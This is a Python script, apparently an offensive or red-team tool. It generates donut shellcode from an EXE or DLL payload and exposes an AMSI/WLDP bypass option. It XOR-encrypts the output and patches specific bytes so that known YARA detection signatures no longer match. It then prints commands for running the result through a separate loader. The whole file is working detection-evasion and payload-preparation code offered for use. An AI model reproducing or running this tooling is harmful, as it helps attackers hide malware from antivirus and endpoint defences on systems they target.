#!/usr/bin/env -S /home/trigger/.local/bin/uv run --script
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "donut-shellcode",
# ]
# ///
"""
Donut Encoder - Creates XOR-encrypted donut shellcode

This script generates shellcode using the donut library and applies XOR encryption.
It supports EXE and DLL payloads with various configuration options.

Usage:
    python donutEncoder.py -i payload.exe [-x XOR_key] [-a "payload arguments"]
"""

import sys
import os
import io
import donut
import argparse
import binascii

class Color:
    """Terminal color codes for output formatting"""
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def get_args():
    """
    Parse and validate command line arguments
    
    @return The parsed command line arguments
    """
    parser = argparse.ArgumentParser(description='Donut XOR Encoder - Creates encrypted donut shellcode')
    parser.add_argument('-i', '--input', dest='payload_file', type=str, required=True, help='Payload file (EXE/DLL)')
    parser.add_argument('-x', '--xor', dest='xor_key', type=str, required=False, help='XOR encryption key')
    parser.add_argument('-a', '--args', dest='payload_args', type=str, required=False, help='Optional arguments for the payload')
    parser.add_argument('-o', '--output', dest='output_file', type=str, required=False, default='payload.bin', help='Output file')
    parser.add_argument('-n', '--namespace', dest='namespace', type=str, required=False, help='Optional class name (required for .NET DLL)')
    parser.add_argument('-m', '--method', dest='method', type=str, required=False, help='Optional method name (required for DLL)')
    parser.add_argument('-r', '--arch', dest='arch', type=int, required=False, help='Target architecture: 1=x86, 2=amd64, 3=x86+amd64 (default)', default=3)
    parser.add_argument('-b', '--bypass', dest='bypass', type=int, required=False, help='Bypass AMSI/WLDP: 1=skip (default), 2=abort on fail, 3=continue on fail', default=1)
    
    args = parser.parse_args()
    
    # Runtime assertion: Payload file must be specified
    assert args.payload_file is not None, "Payload file must be specified"
    
    # Runtime assertion: Arch must be 1, 2, or 3
    assert args.arch in [1, 2, 3], "Architecture must be 1, 2, or 3"
    
    return args

def xor_encrypt(data, key):
    """
    XOR encrypt data using the provided key
    
    @param data The binary data to encrypt
    @param key The encryption key string
    @return The encrypted data as a bytearray
    """
    # Runtime assertion: Data and key must not be None
    assert data is not None, "Data cannot be None"
    assert key is not None, "Key cannot be None"
    
    # Runtime assertion: Key must not be empty
    assert len(key) > 0, "Key cannot be empty"
    
    encrypted = bytearray()
    key_bytes = key.encode()
    key_len = len(key_bytes)
    
    for i, b in enumerate(data):
        encrypted.append(b ^ key_bytes[i % key_len])
    
    return encrypted

def patch_yara_stub(shellcode: bytes) -> bytes:
    patched = bytearray(shellcode)

    # Patch #1: x64 signature from rule f40e3759
    sig1 = b"\x06\xB8\x03\x40\x00\x80\xC3\x4C\x8B\x49\x10\x49\x8B\x81\x30\x08\x00\x00"
    idx1 = shellcode.find(sig1)
    if idx1 != -1:
        print(Color.YELLOW + "[*] Found and patching YARA signature #1 (x64 stub)" + Color.END)
        # Mutate a single byte in the signature to break the pattern
        patched[idx1 + 2] ^= 0x01  # e.g., change 0x03 to 0x02

    # Patch #2: x86 signature from rule f40e3759
    sig2 = b"\x04\x75\xEE\x89\x31\xF0\xFF\x46\x04\x33\xC0\xEB\x08\x83\x21\x00\xB8\x02"
    idx2 = shellcode.find(sig2)
    if idx2 != -1:
        print(Color.YELLOW + "[*] Found and patching YARA signature #2 (x86 stub)" + Color.END)
        # Mutate a single byte — e.g., change 0xFF to 0xFE
        patched[idx2 + 6] ^= 0x01

    # Final check
    if idx1 == -1 and idx2 == -1:
        print(Color.CYAN + "[*] No known YARA signatures found in shellcode" + Color.END)

    return bytes(patched)

def create_donut(args):
    """
    Create donut shellcode and encrypt it
    
    @param args The command line arguments
    @return TRUE if successful, FALSE otherwise
    """
    try:
        # Check if payload file exists
        if not os.path.isfile(args.payload_file):
            print(Color.RED + f"[-] Error: Payload file {args.payload_file} not found!" + Color.END)
            return False
            
        # Determine if file is a DLL based on extension
        is_dll = args.payload_file.lower().endswith('.dll')
        
        # Verify DLL requirements are met
        if is_dll:
            if not args.namespace:
                print(Color.RED + "[-] Error: Namespace is required for DLL payloads" + Color.END)
                return False
            if not args.method:
                print(Color.RED + "[-] Error: Method is required for DLL payloads" + Color.END)
                return False
                
        # Create donut shellcode with appropriate parameters
        print(Color.BLUE + "[+] Generating donut shellcode..." + Color.END)
        
        # Generate shellcode with proper parameters based on file type
        if is_dll:
            shellcode = donut.create(
                file=args.payload_file,
                params=str(args.payload_args),
                arch=args.arch,
                bypass=args.bypass,
                cls=args.namespace,
                method=args.method
            )
        else:
            shellcode = donut.create(
                file=args.payload_file,
                params=str(args.payload_args),
                arch=args.arch,
                bypass=args.bypass
            )
            
        # Runtime assertion: Shellcode generation must succeed
        assert shellcode is not None, "Failed to generate shellcode"
        
        # Runtime assertion: Shellcode must not be empty
        assert len(shellcode) > 0, "Generated shellcode is empty"
            
        if not shellcode:
            print(Color.RED + "[-] Failed to generate donut shellcode" + Color.END)
            return False
            
        print(Color.GREEN + f"[+] Successfully generated {len(shellcode)} bytes of donut shellcode" + Color.END)
        
        # Yara rule reee
        shellcode = patch_yara_stub(shellcode)

        # Encrypt the shellcode if key is provided
        if args.xor_key:
            print(Color.BLUE + f"[+] Encrypting with XOR key: {args.xor_key}" + Color.END)
            encrypted_shellcode = xor_encrypt(shellcode, args.xor_key)
        else:
            print(Color.YELLOW + "[*] No encryption key provided, storing raw shellcode" + Color.END)
            encrypted_shellcode = shellcode
        
        # Write the result to output file
        with open(args.output_file, "wb") as f:
            bytes_written = f.write(encrypted_shellcode)
            
            # Runtime assertion: All bytes must be written
            assert bytes_written == len(encrypted_shellcode), "Failed to write all bytes to file"
            
        print(Color.GREEN + f"[+] Shellcode written to {args.output_file} ({len(encrypted_shellcode)} bytes)" + Color.END)
        
        # Print usage instructions if key was provided
        if args.xor_key:
            print(Color.YELLOW + f"[+] Load with: .\\Loader.exe /p:{args.output_file} /x:{args.xor_key}" + Color.END)
        else:
            print(Color.YELLOW + f"[+] Load with: .\\Loader.exe /p:{args.output_file}" + Color.END)
        
        return True
        
    except Exception as e:
        print(Color.RED + f"[-] Error: {str(e)}" + Color.END)
        print(Color.RED + "[-] If this error involves using -a try using --args='arguments' instead." + Color.END)
        return False

def main():
    """
    Main function - Parse arguments and create donut shellcode
    """
    args = get_args()
    result = create_donut(args)
    
    # Return appropriate exit code based on result
    sys.exit(0 if result else 1)

if __name__ == '__main__':
    main()

